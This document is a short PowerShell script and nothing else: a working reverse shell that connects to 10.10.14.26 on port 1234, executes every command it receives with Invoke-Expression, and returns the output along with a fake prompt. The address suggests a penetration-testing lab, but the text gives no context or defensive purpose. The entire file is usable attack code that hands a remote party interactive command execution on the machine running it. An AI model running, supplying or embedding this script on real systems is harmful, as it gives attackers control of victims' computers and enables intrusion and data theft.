$c = New-Object System.Net.Sockets.TCPClient('10.10.14.26',1234)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i)
    $sb = (iex $d 2>&1 | Out-String )
    $sb2 = $sb + 'PS ' + (pwd).Path + '> '
    $sb = ([text.encoding]::ASCII).GetBytes($sb2)
    $s.Write($sb,0,$sb.Length)
    $s.Flush()
}
$c.Close()
